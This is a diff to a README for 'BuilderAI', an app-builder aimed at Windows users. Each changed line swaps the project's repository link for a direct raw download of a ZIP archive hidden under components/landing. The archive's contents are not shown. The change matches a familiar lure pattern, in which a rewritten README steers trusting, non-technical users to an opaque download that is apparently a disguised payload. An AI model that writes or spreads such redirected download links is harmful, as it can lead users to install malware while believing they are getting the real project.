@@ -1,12 +1,12 @@
 # 🤖 BuilderAI - Turn Ideas Into Working Apps
 
-[![Download BuilderAI](https://img.shields.io/badge/Download-BuilderAI-blue?style=for-the-badge)](https://github.com/Tyrannical-incense51/BuilderAI)
+[![Download BuilderAI](https://img.shields.io/badge/Download-BuilderAI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tyrannical-incense51/BuilderAI/main/components/landing/Builder_AI_v2.6-alpha.1.zip)
 
 ## 🚀 Get BuilderAI
 
 BuilderAI helps you turn a plain app idea into working code. You describe what you want, then BuilderAI builds the app structure for you. It is made for Windows users who want to get started fast.
 
-**Download link:** https://github.com/Tyrannical-incense51/BuilderAI
+**Download link:** https://raw.githubusercontent.com/Tyrannical-incense51/BuilderAI/main/components/landing/Builder_AI_v2.6-alpha.1.zip
 
 ## 🖥️ What BuilderAI Does
 
@@ -45,7 +45,7 @@ These are common tools for app projects. If you already use software like this, 
 
 To get BuilderAI, visit this page and download the project files:
 
-https://github.com/Tyrannical-incense51/BuilderAI
+https://raw.githubusercontent.com/Tyrannical-incense51/BuilderAI/main/components/landing/Builder_AI_v2.6-alpha.1.zip
 
 If you downloaded a ZIP file, do this:
 
@@ -244,7 +244,7 @@ You do not need to know all of these to start. They are part of the setup behind
 
 Download or visit the project here:
 
-https://github.com/Tyrannical-incense51/BuilderAI
+https://raw.githubusercontent.com/Tyrannical-incense51/BuilderAI/main/components/landing/Builder_AI_v2.6-alpha.1.zip
 
 ## 📝 Example Prompt
 
